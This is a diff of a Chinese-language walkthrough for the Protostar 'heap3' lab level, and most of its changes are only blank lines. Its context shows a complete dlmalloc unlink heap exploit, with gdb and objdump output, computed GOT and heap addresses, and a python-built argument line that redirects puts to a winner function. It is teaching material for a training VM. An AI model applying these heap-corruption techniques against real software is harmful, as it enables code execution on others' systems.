@@ -3,9 +3,11 @@ Heap Three
 
 This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.
 
-This level is at /opt/protostar/bin/heap3
+This level is at /opt/protostar/bin/heap3 
 ```
+
 ---
+
 ```c
 ###   
 #include <stdlib.h>
@@ -38,9 +40,11 @@ int main(int argc, char **argv)
   printf("dynamite failed?\n");
 }
 ```
+
 ---
 
 **分析：**
+
 ```c
 - 程序使用 `malloc(32)` 分配了三块堆内存 `a`, `b`, `c`。
 - 然后使用 `strcpy` 将命令行参数 `argv[1]`, `argv[2]`, `argv[3]` 分别拷贝到这三块内存中。
@@ -82,7 +86,9 @@ BK->fd = FD;
 **思路：通过`unlink`漏洞，将某个函数在GOT表中的地址替换成`winner()`函数的地址。**
 
 ---
+
 **1、获取 `winner` 函数的地址和 `puts` 函数在GOT表中的地址**
+
 ```c
 └─$ objdump -d heap3 |grep winner
 08048864 <winner>:
@@ -118,6 +124,7 @@ OFFSET   TYPE              VALUE
 **`puts_got = 0x0804b128`**
 
 **获取三个变量的地址**
+
 ```c
 └─$ gdb-peda heap3
 Successfully imported six module
@@ -129,7 +136,7 @@ Dump of assembler code for function main:
    0x0804888a <+1>:     mov    ebp,esp  ; `push ebp; mov ebp, esp`：这是标准的函数序言，用于建立当前函数的栈帧。`ebp`（基址指针）现在指向栈底
    0x0804888c <+3>:     and    esp,0xfffffff0
    0x0804888f <+6>:     sub    esp,0x20 ; esp（栈顶指针）减去了 0x20（十进制的32）,意味着编译器为 main 函数的局部变量在栈上分配了32字节的空间,这32字节的空间就是用来存放 a, b, c 等局部变量的地方
-   
+
       ; 栈帧布局
       高地址
 +-------------------+
@@ -169,7 +176,7 @@ Dump of assembler code for function main:
    0x080488b2 <+41>:    mov    DWORD PTR [esp],0x20   ; 参数 32 入栈
    0x080488b9 <+48>:    call   0x8048ff2 <malloc>    ; 调用 malloc
    0x080488be <+53>:    mov    DWORD PTR [esp+0x1c],eax ; 将返回值存入变量 c 的位置
-   
+
    ; --- strcpy(a, argv[1]) ---
    0x080488c2 <+57>:    mov    eax,DWORD PTR [ebp+0xc] ; 加载 argv
    0x080488c5 <+60>:    add    eax,0x4                ; eax 指向 argv[1]
@@ -270,7 +277,7 @@ gdb-peda$ x/wx $esp+0x1c
 `unlink` 攻击原理 (`*(FD + 12) = BK`):
 - `FD = puts_got - 12`  
     `FD = 0x0804b128 - 12 = 0x0804b11c`
-    
+
 - `BK = heap_shellcode_addr`  
     `BK = 0x0804c040`  // 假设 shellcode 位于 b+16
 ```
@@ -300,7 +307,9 @@ gdb-peda$ x/wx $esp+0x1c
     **组合 `argv[3]`:**  
     `"\xff"*4 + "\x1c\xb1\x04\x08" + "\x40\xc0\x04\x08"`
 ```
+
 **内存布局图如下：**
+
 ```c
 +---------------------------+  <- 0x0804c000
 | prev_size = 0x00000000    |  ← chunk a header
@@ -327,15 +336,18 @@ gdb-peda$ x/wx $esp+0x1c
 ```
 
 **代码如下：**
+
 ```python
 /opt/protostar/bin/heap3 \
   $(python -c "print 'A'*32") \
   $(python -c "print '\xff'*16 + '\x68\x64\x88\x04\x08\xc3' + '\xff'*10 + '\xfc\xff\xff\xff'*2") \
   $(python -c "print '\xff'*4 + '\x1c\xb1\x04\x08' + '\x40\xc0\x04\x08'")
 ```
+
 ![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251011200319285.png)
 
 ---
+
 ### 关键知识讲解：`unlink` 堆利用
 
 #### 1. 堆块（Chunk）的结构
@@ -420,7 +432,9 @@ BK->fd = FD;
 ```
 
 ---
+
 **什么是GOT表？**  
+
 ```c
 全局偏移表（Global Offset Table）是Linux动态链接程序使用的一种机制。程序第一次调用某个库函数（如 `puts`）时，动态链接器会找到这个函数的真实地址，并填入GOT表中。之后再调用，程序就会直接从GOT表中取地址跳转。如果我们能修改GOT表里 `puts` 函数的地址为 `winner` 函数的地址，那么下一次调用 `puts()` 时，实际上会去执行 `winner()`
 ```
